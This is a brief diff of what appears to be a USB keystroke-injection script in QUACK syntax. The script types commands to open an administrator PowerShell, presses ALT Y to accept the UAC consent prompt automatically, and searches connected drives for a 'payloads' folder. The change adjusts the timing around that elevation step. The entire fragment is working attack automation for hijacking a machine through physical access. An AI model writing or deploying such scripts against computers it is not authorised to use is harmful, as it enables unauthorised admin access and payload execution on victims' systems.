@@ -9,9 +9,9 @@ QUACK ENTER
 QUACK DELAY 1000
 QUACK STRING "exit Start-Process powershell -Verb RunAs"
 QUACK ENTER
-QUACK DELAY 2200
-QUACK ALT Y
 QUACK DELAY 1000
+QUACK ALT Y
+QUACK DELAY 500
 QUACK STRING "$drive=(Get-PSDrive -PSProvider FileSystem | ?{Test-Path(\"$($_.Root)payloads\")}).Root"
 QUACK ENTER
 QUACK DELAY 100
